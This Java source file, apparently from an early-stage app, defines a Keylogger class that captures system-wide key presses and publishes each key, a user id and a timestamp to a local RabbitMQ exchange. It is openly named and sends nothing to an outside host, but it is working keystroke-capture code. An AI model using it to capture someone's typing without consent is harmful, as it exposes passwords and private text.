package com.mibef108287.app;

import java.io.IOException;
import java.sql.Timestamp;

import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import com.rabbitmq.client.Channel;
import com.rabbitmq.client.Connection;
import com.rabbitmq.client.ConnectionFactory;

public class Keylogger implements NativeKeyListener{
  private final String EXCHANGE_NAME = "strokes";
  private Channel channel; 

  public Keylogger() throws Exception{
    ConnectionFactory factory = new ConnectionFactory();
    Connection connection = factory.newConnection();
    factory.setHost("localhost");
    channel = connection.createChannel();
    channel.exchangeDeclare(EXCHANGE_NAME, "fanout");
  }

  @Override
  public void nativeKeyPressed(NativeKeyEvent nativeEvent){
    try {
      String key = NativeKeyEvent.getKeyText(nativeEvent.getKeyCode());
      int id = 1; // Because we don't have login yet
      String payload = String.format("{\"author\": {\"id\" : \"%d\"},\"pressedKey\": \"%s\", \"ts\": \"%s\"}", id, key, new Timestamp(System.currentTimeMillis()).toString());
      channel.basicPublish(EXCHANGE_NAME,"",null,payload.getBytes());
    } catch (IOException e) {
      System.err.println(e);
      // log this maybe
    }
  }

  @Override
  public void nativeKeyTyped(NativeKeyEvent nativeEvent) {
    
  }
}
